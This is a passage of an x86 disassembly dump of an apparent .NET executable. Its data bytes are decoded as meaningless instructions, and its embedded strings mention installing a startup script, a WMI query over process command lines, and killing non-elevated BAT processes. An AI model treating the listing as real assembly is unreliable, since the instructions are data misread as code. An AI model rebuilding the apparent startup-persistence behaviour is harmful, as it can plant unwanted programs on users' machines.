  40755e:	74 00                	je     0x407560
  407560:	61                   	popa
  407561:	00 72 00             	add    %dh,0x0(%edx)
  407564:	74 00                	je     0x407566
  407566:	75 00                	jne    0x407568
  407568:	70 00                	jo     0x40756a
  40756a:	20 00                	and    %al,(%eax)
  40756c:	73 00                	jae    0x40756e
  40756e:	63 00                	arpl   %eax,(%eax)
  407570:	72 00                	jb     0x407572
  407572:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407578:	20 00                	and    %al,(%eax)
  40757a:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  407580:	74 00                	je     0x407582
  407582:	61                   	popa
  407583:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407587:	00 65 00             	add    %ah,0x0(%ebp)
  40758a:	64 00 20             	add    %ah,%fs:(%eax)
  40758d:	00 73 00             	add    %dh,0x0(%ebx)
  407590:	75 00                	jne    0x407592
  407592:	63 00                	arpl   %eax,(%eax)
  407594:	63 00                	arpl   %eax,(%eax)
  407596:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40759a:	73 00                	jae    0x40759c
  40759c:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4075a0:	6c                   	insb   (%dx),%es:(%edi)
  4075a1:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  4075a5:	00 21                	add    %ah,(%ecx)
  4075a7:	00 00                	add    %al,(%eax)
  4075a9:	19 20                	sbb    %esp,(%eax)
  4075ab:	00 20                	add    %ah,(%eax)
  4075ad:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4075b1:	00 63 00             	add    %ah,0x0(%ebx)
  4075b4:	61                   	popa
  4075b5:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4075b9:	00 6f 00             	add    %ch,0x0(%edi)
  4075bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4075bd:	00 3a                	add    %bh,(%edx)
  4075bf:	00 20                	add    %ah,(%eax)
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	3b 3d 00 3d 00 3d    	cmp    0x3d003d00,%edi
  4075c9:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075cf:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075d5:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075db:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075e1:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075e7:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075ed:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075f3:	00 3d 00 3d 00 3d    	add    %bh,0x3d003d00
  4075f9:	00 3d 00 0a 00 00    	add    %bh,0xa00
  4075ff:	45                   	inc    %ebp
  407600:	20 00                	and    %al,(%eax)
  407602:	20 00                	and    %al,(%eax)
  407604:	45                   	inc    %ebp
  407605:	00 72 00             	add    %dh,0x0(%edx)
  407608:	72 00                	jb     0x40760a
  40760a:	6f                   	outsl  %ds:(%esi),(%dx)
  40760b:	00 72 00             	add    %dh,0x0(%edx)
  40760e:	20 00                	and    %al,(%eax)
  407610:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  407616:	74 00                	je     0x407618
  407618:	61                   	popa
  407619:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40761d:	00 69 00             	add    %ch,0x0(%ecx)
  407620:	6e                   	outsb  %ds:(%esi),(%dx)
  407621:	00 67 00             	add    %ah,0x0(%edi)
  407624:	20 00                	and    %al,(%eax)
  407626:	73 00                	jae    0x407628
  407628:	74 00                	je     0x40762a
  40762a:	61                   	popa
  40762b:	00 72 00             	add    %dh,0x0(%edx)
  40762e:	74 00                	je     0x407630
  407630:	75 00                	jne    0x407632
  407632:	70 00                	jo     0x407634
  407634:	20 00                	and    %al,(%eax)
  407636:	73 00                	jae    0x407638
  407638:	63 00                	arpl   %eax,(%eax)
  40763a:	72 00                	jb     0x40763c
  40763c:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407642:	3a 00                	cmp    (%eax),%al
  407644:	00 05 20 00 20 00    	add    %al,0x200020
  40764a:	00 03                	add    %al,(%ebx)
  40764c:	5c                   	pop    %esp
  40764d:	00 00                	add    %al,(%eax)
  40764f:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  407654:	00 80 95 53 00 45    	add    %al,0x45005395(%eax)
  40765a:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40765e:	00 43 00             	add    %al,0x0(%ebx)
  407661:	54                   	push   %esp
  407662:	00 20                	add    %ah,(%eax)
  407664:	00 50 00             	add    %dl,0x0(%eax)
  407667:	72 00                	jb     0x407669
  407669:	6f                   	outsl  %ds:(%esi),(%dx)
  40766a:	00 63 00             	add    %ah,0x0(%ebx)
  40766d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407671:	73 00                	jae    0x407673
  407673:	49                   	dec    %ecx
  407674:	00 64 00 2c          	add    %ah,0x2c(%eax,%eax,1)
  407678:	00 20                	add    %ah,(%eax)
  40767a:	00 43 00             	add    %al,0x0(%ebx)
  40767d:	6f                   	outsl  %ds:(%esi),(%dx)
  40767e:	00 6d 00             	add    %ch,0x0(%ebp)
  407681:	6d                   	insl   (%dx),%es:(%edi)
  407682:	00 61 00             	add    %ah,0x0(%ecx)
  407685:	6e                   	outsb  %ds:(%esi),(%dx)
  407686:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40768a:	00 69 00             	add    %ch,0x0(%ecx)
  40768d:	6e                   	outsb  %ds:(%esi),(%dx)
  40768e:	00 65 00             	add    %ah,0x0(%ebp)
  407691:	20 00                	and    %al,(%eax)
  407693:	46                   	inc    %esi
  407694:	00 52 00             	add    %dl,0x0(%edx)
  407697:	4f                   	dec    %edi
  407698:	00 4d 00             	add    %cl,0x0(%ebp)
  40769b:	20 00                	and    %al,(%eax)
  40769d:	57                   	push   %edi
  40769e:	00 69 00             	add    %ch,0x0(%ecx)
  4076a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4076a2:	00 33                	add    %dh,(%ebx)
  4076a4:	00 32                	add    %dh,(%edx)
  4076a6:	00 5f 00             	add    %bl,0x0(%edi)
  4076a9:	50                   	push   %eax
  4076aa:	00 72 00             	add    %dh,0x0(%edx)
  4076ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ae:	00 63 00             	add    %ah,0x0(%ebx)
  4076b1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4076b5:	73 00                	jae    0x4076b7
  4076b7:	20 00                	and    %al,(%eax)
  4076b9:	57                   	push   %edi
  4076ba:	00 48 00             	add    %cl,0x0(%eax)
  4076bd:	45                   	inc    %ebp
  4076be:	00 52 00             	add    %dl,0x0(%edx)
  4076c1:	45                   	inc    %ebp
  4076c2:	00 20                	add    %ah,(%eax)
  4076c4:	00 43 00             	add    %al,0x0(%ebx)
  4076c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4076c8:	00 6d 00             	add    %ch,0x0(%ebp)
  4076cb:	6d                   	insl   (%dx),%es:(%edi)
  4076cc:	00 61 00             	add    %ah,0x0(%ecx)
  4076cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d0:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  4076d4:	00 69 00             	add    %ch,0x0(%ecx)
  4076d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d8:	00 65 00             	add    %ah,0x0(%ebp)
  4076db:	20 00                	and    %al,(%eax)
  4076dd:	4c                   	dec    %esp
  4076de:	00 49 00             	add    %cl,0x0(%ecx)
  4076e1:	4b                   	dec    %ebx
  4076e2:	00 45 00             	add    %al,0x0(%ebp)
  4076e5:	20 00                	and    %al,(%eax)
  4076e7:	27                   	daa
  4076e8:	00 25 00 01 05 25    	add    %ah,0x25050100
  4076ee:	00 27                	add    %ah,(%edi)
  4076f0:	00 01                	add    %al,(%ecx)
  4076f2:	13 50 00             	adc    0x0(%eax),%edx
  4076f5:	72 00                	jb     0x4076f7
  4076f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f8:	00 63 00             	add    %ah,0x0(%ebx)
  4076fb:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4076ff:	73 00                	jae    0x407701
  407701:	49                   	dec    %ecx
  407702:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407706:	51                   	push   %ecx
  407707:	45                   	inc    %ebp
  407708:	00 6e 00             	add    %ch,0x0(%esi)
  40770b:	63 00                	arpl   %eax,(%eax)
  40770d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407711:	72 00                	jb     0x407713
  407713:	61                   	popa
  407714:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  407718:	00 20                	add    %ah,(%eax)
  40771a:	00 70 00             	add    %dh,0x0(%eax)
  40771d:	72 00                	jb     0x40771f
  40771f:	6f                   	outsl  %ds:(%esi),(%dx)
  407720:	00 63 00             	add    %ah,0x0(%ebx)
  407723:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407727:	73 00                	jae    0x407729
  407729:	6f                   	outsl  %ds:(%esi),(%dx)
  40772a:	00 20                	add    %ah,(%eax)
  40772c:	00 6e 00             	add    %ch,0x0(%esi)
  40772f:	e3 00                	jecxz  0x407731
  407731:	6f                   	outsl  %ds:(%esi),(%dx)
  407732:	00 20                	add    %ah,(%eax)
  407734:	00 65 00             	add    %ah,0x0(%ebp)
  407737:	6c                   	insb   (%dx),%es:(%edi)
  407738:	00 65 00             	add    %ah,0x0(%ebp)
  40773b:	76 00                	jbe    0x40773d
  40773d:	61                   	popa
  40773e:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  407742:	00 20                	add    %ah,(%eax)
  407744:	00 63 00             	add    %ah,0x0(%ebx)
  407747:	6f                   	outsl  %ds:(%esi),(%dx)
  407748:	00 6d 00             	add    %ch,0x0(%ebp)
  40774b:	20 00                	and    %al,(%eax)
  40774d:	50                   	push   %eax
  40774e:	00 49 00             	add    %cl,0x0(%ecx)
  407751:	44                   	inc    %esp
  407752:	00 3a                	add    %bh,(%edx)
  407754:	00 20                	add    %ah,(%eax)
  407756:	00 01                	add    %al,(%ecx)
  407758:	57                   	push   %edi
  407759:	45                   	inc    %ebp
  40775a:	00 72 00             	add    %dh,0x0(%edx)
  40775d:	72 00                	jb     0x40775f
  40775f:	6f                   	outsl  %ds:(%esi),(%dx)
  407760:	00 20                	add    %ah,(%eax)
  407762:	00 61 00             	add    %ah,0x0(%ecx)
  407765:	6f                   	outsl  %ds:(%esi),(%dx)
  407766:	00 20                	add    %ah,(%eax)
  407768:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40776c:	00 6e 00             	add    %ch,0x0(%esi)
  40776f:	74 00                	je     0x407771
  407771:	61                   	popa
  407772:	00 72 00             	add    %dh,0x0(%edx)
  407775:	20 00                	and    %al,(%eax)
  407777:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40777b:	63 00                	arpl   %eax,(%eax)
  40777d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407781:	72 00                	jb     0x407783
  407783:	61                   	popa
  407784:	00 72 00             	add    %dh,0x0(%edx)
  407787:	20 00                	and    %al,(%eax)
  407789:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40778f:	74 00                	je     0x407791
  407791:	e2 00                	loop   0x407793
  407793:	6e                   	outsb  %ds:(%esi),(%dx)
  407794:	00 63 00             	add    %ah,0x0(%ebx)
  407797:	69 00 61 00 73 00    	imul   $0x730061,(%eax),%eax
  40779d:	20 00                	and    %al,(%eax)
  40779f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4077a3:	20 00                	and    %al,(%eax)
  4077a5:	42                   	inc    %edx
  4077a6:	00 41 00             	add    %al,0x0(%ecx)
  4077a9:	54                   	push   %esp
  4077aa:	00 3a                	add    %bh,(%edx)
  4077ac:	00 20                	add    %ah,(%eax)
  4077ae:	00 01                	add    %al,(%ecx)
  4077b0:	c3                   	ret
  4077b1:	3a c8                	cmp    %al,%cl
  4077b3:	67 d5 ae             	addr16 aad $0xae
  4077b6:	ba 4b 8e 05 7c       	mov    $0x7c058e4b,%edx
  4077bb:	75 c2                	jne    0x40777f
  4077bd:	df 00                	filds  (%eax)
  4077bf:	a3 00 08 b7 7a       	mov    %eax,0x7ab70800
  4077c4:	5c                   	pop    %esp
  4077c5:	56                   	push   %esi
  4077c6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4077c9:	89 04 00             	mov    %eax,(%eax,%eax,1)
  4077cc:	01 18                	add    %ebx,(%eax)
  4077ce:	0e                   	push   %cs
  4077cf:	05 00 02 18 18       	add    $0x18180200,%eax
  4077d4:	0e                   	push   %cs
  4077d5:	08 00                	or     %al,(%eax)
  4077d7:	04 02                	add    $0x2,%al
  4077d9:	18 19                	sbb    %bl,(%ecx)
  4077db:	09 10                	or     %edx,(%eax)
  4077dd:	09 02                	or     %eax,(%edx)
  4077df:	06                   	push   %es
  4077e0:	09 05 00 01 01 1d    	or     %eax,0x1d010100
  4077e6:	0e                   	push   %cs
  4077e7:	04 00                	add    $0x0,%al
  4077e9:	01 02                	add    %eax,(%edx)
  4077eb:	0e                   	push   %cs
  4077ec:	04 00                	add    $0x0,%al
  4077ee:	01 01                	add    %eax,(%ecx)
  4077f0:	0e                   	push   %cs
  4077f1:	03 00                	add    (%eax),%eax
  4077f3:	00 02                	add    %al,(%edx)
  4077f5:	0a 00                	or     (%eax),%al
  4077f7:	03 1d 05 1d 05 1d    	add    0x1d051d05,%ebx
  4077fd:	05 1d 05 06 00       	add    $0x6051d,%eax
  407802:	01 1d 05 1d 05 05    	add    %ebx,0x5051d05
  407808:	00 01                	add    %al,(%ecx)
  40780a:	1d 05 0e 03 20       	sbb    $0x20030e05,%eax
  40780f:	00 01                	add    %al,(%ecx)
  407811:	05 20 01 01 11       	add    $0x11010120,%eax
  407816:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407819:	01 01                	add    %eax,(%ecx)
  40781b:	08 04 20             	or     %al,(%eax,%eiz,1)
  40781e:	01 01                	add    %eax,(%ecx)
  407820:	0e                   	push   %cs
  407821:	02 06                	add    (%esi),%al
  407823:	0e                   	push   %cs
  407824:	05 00 01 12 21       	add    $0x21120100,%eax
  407829:	0e                   	push   %cs
  40782a:	06                   	push   %es
  40782b:	00 02                	add    %al,(%edx)
  40782d:	01 0e                	add    %ecx,(%esi)
  40782f:	11 29                	adc    %ebp,(%ecx)
  407831:	03 00                	add    (%eax),%eax
  407833:	00 0e                	add    %cl,(%esi)
  407835:	03 20                	add    (%eax),%esp
  407837:	00 0e                	add    %cl,(%esi)
  407839:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40783e:	0e                   	push   %cs
  40783f:	05 00 01 11 39       	add    $0x39110100,%eax
  407844:	0e                   	push   %cs
  407845:	04 00                	add    $0x0,%al
  407847:	00 12                	add    %dl,(%edx)
  407849:	21 03                	and    %eax,(%ebx)
  40784b:	00 00                	add    %al,(%eax)
  40784d:	08 04 00             	or     %al,(%eax,%eax,1)
  407850:	01 19                	add    %ebx,(%ecx)
  407852:	0b 08                	or     (%eax),%ecx
  407854:	00 04 01             	add    %al,(%ecx,%eax,1)
  407857:	1d 05 08 18 08       	sbb    $0x8180805,%eax
  40785c:	04 00                	add    $0x0,%al
  40785e:	00 12                	add    %dl,(%edx)
  407860:	4d                   	dec    %ebp
  407861:	04 20                	add    $0x20,%al
  407863:	00 1d 0e 05 00 02    	add    %bl,0x200050e
  407869:	02 0e                	add    (%esi),%cl
  40786b:	0e                   	push   %cs
  40786c:	04 20                	add    $0x20,%al
  40786e:	01 02                	add    %eax,(%edx)
  407870:	0e                   	push   %cs
  407871:	06                   	push   %es
  407872:	00 02                	add    %al,(%edx)
  407874:	01 0e                	add    %ecx,(%esi)
  407876:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40787b:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40787e:	05 20 01 01 12       	add    $0x12010120,%eax
  407883:	51                   	push   %ecx
  407884:	06                   	push   %es
  407885:	20 01                	and    %al,(%ecx)
  407887:	1d 0e 1d 03 06       	sbb    $0x6031d0e,%eax
  40788c:	00 01                	add    %al,(%ecx)
  40788e:	12 4d 1d             	adc    0x1d(%ebp),%cl
  407891:	05 04 20 00 12       	add    $0x12002004,%eax
  407896:	61                   	popa
  407897:	06                   	push   %es
  407898:	20 02                	and    %al,(%edx)
  40789a:	1c 1c                	sbb    $0x1c,%al
  40789c:	1d 1c 22 07 13       	sbb    $0x1307221c,%eax
  4078a1:	02 12                	add    (%edx),%dl
  4078a3:	69 18 18 1d 05 09    	imul   $0x9051d18,(%eax),%ebx
  4078a9:	0e                   	push   %cs
  4078aa:	12 4d 12             	adc    0x12(%ebp),%cl
  4078ad:	51                   	push   %ecx
  4078ae:	12 0c 1d 05 1d 0e 12 	adc    0x120e1d05(,%ebx,1),%cl
  4078b5:	61                   	popa
  4078b6:	1d 05 1d 05 1d       	sbb    $0x1d051d05,%eax
  4078bb:	0e                   	push   %cs
  4078bc:	08 1d 03 1d 1c 05    	or     %bl,0x51c1d03
  4078c2:	00 01                	add    %al,(%ecx)
  4078c4:	0e                   	push   %cs
  4078c5:	11 71 05             	adc    %esi,0x5(%ecx)
  4078c8:	00 01                	add    %al,(%ecx)
  4078ca:	12 79 0e             	adc    0xe(%ecx),%bh
  4078cd:	04 00                	add    $0x0,%al
  4078cf:	00 11                	add    %dl,(%ecx)
  4078d1:	7d 05                	jge    0x4078d8
  4078d3:	20 02                	and    %al,(%edx)
  4078d5:	0e                   	push   %cs
  4078d6:	08 08                	or     %cl,(%eax)
  4078d8:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4078dd:	1c 04                	sbb    $0x4,%al
  4078df:	00 01                	add    %al,(%ecx)
  4078e1:	0e                   	push   %cs
  4078e2:	0e                   	push   %cs
  4078e3:	08 00                	or     %al,(%eax)
  4078e5:	03 02                	add    (%edx),%eax
  4078e7:	0e                   	push   %cs
  4078e8:	0e                   	push   %cs
  4078e9:	11 80 85 06 00 03    	adc    %eax,0x3000685(%eax)
  4078ef:	01 0e                	add    %ecx,(%esi)
  4078f1:	0e                   	push   %cs
  4078f2:	02 06                	add    (%esi),%al
  4078f4:	00 01                	add    %al,(%ecx)
  4078f6:	01 11                	add    %edx,(%ecx)
  4078f8:	80 89 03 00 00 01 09 	orb    $0x9,0x1000003(%ecx)
  4078ff:	07                   	pop    %es
  407900:	05 0e 0e 0e 12       	add    $0x120e0e0e,%eax
  407905:	69 11 7d 05 00 00    	imul   $0x57d,(%ecx),%edx
  40790b:	12 80 8d 06 20 01    	adc    0x120068d(%eax),%al
  407911:	01 12                	add    %edx,(%edx)
  407913:	80 8d 06 20 01 02 11 	orb    $0x11,0x2012006(%ebp)
  40791a:	80 95 08 07 02 12 80 	adcb   $0x80,0x12020708(%ebp)
  407921:	8d 12                	lea    (%edx),%edx
  407923:	80 91 05 20 02 0e 0e 	adcb   $0xe,0xe022005(%ecx)
  40792a:	0e                   	push   %cs
  40792b:	06                   	push   %es
  40792c:	00 03                	add    %al,(%ebx)
  40792e:	0e                   	push   %cs
  40792f:	0e                   	push   %cs
  407930:	0e                   	push   %cs
  407931:	0e                   	push   %cs
  407932:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  407938:	d5 0a                	aad    $0xa
  40793a:	3a 05 20 00 12 80    	cmp    0x80120020,%al
  407940:	9d                   	popf
  407941:	05 20 00 12 80       	add    $0x80120020,%eax
  407946:	a1 05 20 00 12       	mov    0x12002005,%eax
  40794b:	80 a5 04 20 01 1c 0e 	andb   $0xe,0x1c012004(%ebp)
  407952:	05 00 01 12 21       	add    $0x21120100,%eax
  407957:	08 05 00 02 0e 1c    	or     %al,0x1c0e0200
  40795d:	1c 03                	sbb    $0x3,%al
  40795f:	20 00                	and    %al,(%eax)
  407961:	02 12                	add    (%edx),%dl
  407963:	07                   	pop    %es
  407964:	08 0e                	or     %cl,(%esi)
  407966:	0e                   	push   %cs
  407967:	12 80 99 12 80 a9    	adc    -0x567fed67(%eax),%al
  40796d:	09 12                	or     %edx,(%edx)
  40796f:	21 12                	and    %edx,(%edx)
  407971:	69 12 80 a1 06 20    	imul   $0x2006a180,(%edx),%edx
  407977:	01 01                	add    %eax,(%ecx)
  407979:	11 80 bd 06 20 01    	adc    %eax,0x12006bd(%eax)
  40797f:	01 11                	add    %edx,(%ecx)
  407981:	80 c1 09             	add    $0x9,%cl
  407984:	20 02                	and    %al,(%edx)
  407986:	12 80 c5 1d 05 1d    	adc    0x1d051dc5(%eax),%al
  40798c:	05 08 20 03 1d       	add    $0x1d032008,%eax
  407991:	05 1d 05 08 08       	add    $0x808051d,%eax
  407996:	0a 07                	or     (%edi),%al
  407998:	03 12                	add    (%edx),%edx
  40799a:	80 b5 12 80 c5 1d 05 	xorb   $0x5,0x1dc58012(%ebp)
  4079a1:	05 20 01 01 1d       	add    $0x1d010120,%eax
  4079a6:	05 09 20 02 01       	add    $0x1022009,%eax
  4079ab:	12 80 d1 11 80 d5    	adc    -0x2a7fee2f(%eax),%al
  4079b1:	06                   	push   %es
  4079b2:	20 01                	and    %al,(%ecx)
  4079b4:	01 12                	add    %edx,(%edx)
  4079b6:	80 d1 04             	adc    $0x4,%cl
  4079b9:	20 00                	and    %al,(%eax)
  4079bb:	1d 05 0d 07 04       	sbb    $0x4070d05,%eax
  4079c0:	12 80 c9 12 80 c9    	adc    -0x367fed37(%eax),%al
  4079c6:	12 80 cd 1d 05 06    	adc    0x6051dcd(%eax),%al
  4079cc:	20 01                	and    %al,(%ecx)
  4079ce:	12 80 d1 0e 0c 07    	adc    0x70c0ed1(%eax),%al
  4079d4:	04 12                	add    $0x12,%al
  4079d6:	4d                   	dec    %ebp
  4079d7:	12 80 c9 12 80 d1    	adc    -0x2e7fed37(%eax),%al
  4079dd:	1d 05 04 01 00       	sbb    $0x10405,%eax
  4079e2:	00 00                	add    %al,(%eax)
  4079e4:	08 01                	or     %al,(%ecx)
  4079e6:	00 08                	add    %cl,(%eax)
  4079e8:	00 00                	add    %al,(%eax)
  4079ea:	00 00                	add    %al,(%eax)
  4079ec:	00 1e                	add    %bl,(%esi)
  4079ee:	01 00                	add    %eax,(%eax)
  4079f0:	01 00                	add    %eax,(%eax)
  4079f2:	54                   	push   %esp
  4079f3:	02 16                	add    (%esi),%dl
  4079f5:	57                   	push   %edi
  4079f6:	72 61                	jb     0x407a59
  4079f8:	70 4e                	jo     0x407a48
  4079fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4079fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4079fc:	45                   	inc    %ebp
  4079fd:	78 63                	js     0x407a62
  4079ff:	65 70 74             	gs jo  0x407a76
  407a02:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  407a09:	77 73                	ja     0x407a7e
  407a0b:	01 80 9e 2e 01 80    	add    %eax,-0x7ffed162(%eax)
  407a11:	84 53 79             	test   %dl,0x79(%ebx)
  407a14:	73 74                	jae    0x407a8a
  407a16:	65 6d                	gs insl (%dx),%es:(%edi)
  407a18:	2e 53                	cs push %ebx
  407a1a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407a1e:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  407a25:	6d 
  407a26:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  407a2d:	2e 53                	cs push %ebx
  407a2f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407a33:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  407a3a:	69 
  407a3b:	73 73                	jae    0x407ab0
  407a3d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407a44:	69 62 75 74 65 2c 20 	imul   $0x202c6574,0x75(%edx),%esp
  407a4b:	6d                   	insl   (%dx),%es:(%edi)
  407a4c:	73 63                	jae    0x407ab1
  407a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a4f:	72 6c                	jb     0x407abd
  407a51:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  407a58:	73 69                	jae    0x407ac3
  407a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a5b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a5c:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  407a61:	30 2e                	xor    %ch,(%esi)
  407a63:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  407a66:	43                   	inc    %ebx
  407a67:	75 6c                	jne    0x407ad5
  407a69:	74 75                	je     0x407ae0
  407a6b:	72 65                	jb     0x407ad2
  407a6d:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  407a72:	72 61                	jb     0x407ad5
  407a74:	6c                   	insb   (%dx),%es:(%edi)
  407a75:	2c 20                	sub    $0x20,%al
  407a77:	50                   	push   %eax
  407a78:	75 62                	jne    0x407adc
  407a7a:	6c                   	insb   (%dx),%es:(%edi)
  407a7b:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  407a82:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  407a86:	62 37                	bound  %esi,(%edi)
  407a88:	37                   	aaa
  407a89:	61                   	popa
  407a8a:	35 63 35 36 31       	xor    $0x31363563,%eax
  407a8f:	39 33                	cmp    %esi,(%ebx)
  407a91:	34 65                	xor    $0x65,%al
  407a93:	30 38                	xor    %bh,(%eax)
  407a95:	39 15 01 54 02 10    	cmp    %edx,0x10025401
  407a9b:	53                   	push   %ebx
  407a9c:	6b 69 70 56          	imul   $0x56,0x70(%ecx),%ebp
  407aa0:	65 72 69             	gs jb  0x407b0c
  407aa3:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  407aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	01 d4                	add    %edx,%esp
  407aad:	7a 00                	jp     0x407aaf
	...
  407ab7:	00 ee                	add    %ch,%dh
  407ab9:	7a 00                	jp     0x407abb
  407abb:	00 00                	add    %al,(%eax)
  407abd:	20 00                	and    %al,(%eax)
	...
  407ad3:	00 e0                	add    %ah,%al
  407ad5:	7a 00                	jp     0x407ad7
	...
  407adf:	00 00                	add    %al,(%eax)
  407ae1:	00 5f 43             	add    %bl,0x43(%edi)
  407ae4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae5:	72 45                	jb     0x407b2c
  407ae7:	78 65                	js     0x407b4e
  407ae9:	4d                   	dec    %ebp
  407aea:	61                   	popa
  407aeb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  407af2:	72 65                	jb     0x407b59
  407af4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  407af8:	6c                   	insb   (%dx),%es:(%edi)
  407af9:	00 00                	add    %al,(%eax)
  407afb:	00 00                	add    %al,(%eax)
  407afd:	00 ff                	add    %bh,%bh
  407aff:	25 00 20 40 00       	and    $0x402000,%eax
